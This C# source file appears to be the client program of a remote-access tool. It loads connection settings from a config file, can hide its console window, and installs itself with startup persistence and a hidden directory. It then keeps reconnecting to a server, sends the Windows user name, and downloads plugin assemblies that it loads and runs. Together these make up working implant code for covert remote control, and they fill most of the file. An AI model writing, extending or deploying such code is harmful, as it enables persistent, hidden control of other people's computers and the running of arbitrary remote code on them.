using System.Net;
using System.Text;
using System.Text.Json;
using Bilskirnir;
using Damocles;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Serilog;
using Serilog.Events;
using Yggdrasil.Api.Networking;
using Yggdrasil.Messages.ClientToServer;

Log.Logger = new LoggerConfiguration()
    .MinimumLevel.Is(LogEventLevel.Verbose)
    .Enrich.FromLogContext()
    .WriteTo.Console()
    .CreateLogger();

const string configPath = "CONFIG.json";

if (!File.Exists(configPath))
{
    var defaultConfig = new ClientLaunchSettings(6666, "127.0.0.1", "password", false, false, false);
    File.WriteAllText(configPath, JsonSerializer.Serialize(defaultConfig));
    Log.Fatal("Not configured. Please edit \"{0}\"", configPath);
    Thread.Sleep(3000);
    return;
}

var config = JsonSerializer.Deserialize<ClientLaunchSettings>(File.ReadAllText(configPath));

if (config == null)
{
    Log.Fatal("Failed to deserialize config. Deleting...");
    File.Delete(configPath);
    Thread.Sleep(3000);
    return;
}

var port = config.Port;
var address = IPAddress.Parse(config.Address);
var password = config.Password;

if (port is < 1 or > ushort.MaxValue)
{
    Log.Fatal("Invalid port: {0}", port);
    Thread.Sleep(3000);
    return;
}

if (config.HideConsole)
{
    Installer.HideConsoleWindow();
}

Log.Information("PORT: {0} ADDRESS: \"{1}\" PASSWORD: \"{2}\"", port, address, password);
Log.Information("USE STARTUP: {0}, HIDDEN DIRECTORY: {1}", config.Startup, config.DirectoryHidden);

Installer.InstallFiles(config.Startup, config.DirectoryHidden);

if (string.IsNullOrEmpty(password))
{
    Log.Fatal("Password cannot be empty.");
    Thread.Sleep(3000);
    return;
}

var ep = new IPEndPoint(address, port);

while (true)
{
    Client? client = null;

    try
    {

        Log.Information("Attempting to connect.");

        try
        {
            client = new Client(ep, Encoding.UTF8.GetBytes(password));
        }
        catch (Exception e)
        {
            Log.Error("Connection failed ({reason}). Waiting one second and re-trying.", e.Message);
            await Task.Delay(1000);
            continue;
        }

        Log.Information("Connection established!");

        var authTcs = new TaskCompletionSource<bool>();
        var authHandler = new AuthenticationHandler(authTcs);
        client.AddReceiver(authHandler);

        Log.Information("Registered auth receiver.");
        Log.Information("Sending authentication information.");

        await client.Send(new AuthenticationInformation(System.Security.Principal.WindowsIdentity.GetCurrent().Name,
            0));

        Log.Information("Waiting for response...");

        bool result;

        try
        {
            result = await authTcs.Task.WaitAsync(TimeSpan.FromSeconds(5));
        }
        catch (TimeoutException e)
        {
            Log.Information("Timeout! Restarting connection loop.");
            continue;
        }

        Log.Information("Received authentication response. Accepted: {result}", result);

        if (!result)
        {
            Log.Information("Waiting 5 seconds and restarting connection loop.");
            await Task.Delay(5000);
            continue;
        }

        client.RemoveReceiver(authHandler);

        // receive plugin stream

        Log.Information("Creating plugin stream handler.");
        var streamCts = new TaskCompletionSource();
        var streamHandler = new AssemblyStreamHandler(streamCts, client);

        client.AddReceiver(streamHandler);

        try
        {
            await streamCts.Task.WaitAsync(TimeSpan.FromSeconds(30));
        }
        catch (TimeoutException)
        {
            Log.Information("Plugin stream timed out!");
            continue;
        }

        Log.Information("Plugin  count: {c}", streamHandler.PluginBinaries.Count);
        Log.Information("Library count: {c}", streamHandler.LibraryBinaries.Count);

        Log.Information("Preparing builder.");
        var builder = Host.CreateDefaultBuilder(args)
            .UseContentRoot(Directory.GetCurrentDirectory())
            .ConfigureServices((host, services) =>
            {
                services.AddSingleton(client);
                services.AddSingleton<IBilskirnir>(sp => sp.GetRequiredService<Client>());
            })
            .UseSerilog()
            .UseConsoleLifetime()
            .UsePluginLoader(streamHandler.PluginBinaries, streamHandler.LibraryBinaries);

        var host = builder.Build();
        Log.Information("Built host! Commencing execution.");

        client.NetworkTransport.Disconnected += (_, reason, ex) =>
        {
            Log.Error("Connection closed! Reason: {reason}, ex: {exception}. Stopping!", reason, ex);
            host.Services.GetRequiredService<IHostApplicationLifetime>().StopApplication();
        };

        try
        {
            await host.RunAsync();
        }
        catch (Exception e)
        {
            Log.Error("Hosting error: {ex}", e);
        }
    }
    catch (Exception e)
    {
        Log.Error(e.ToString());
    }
}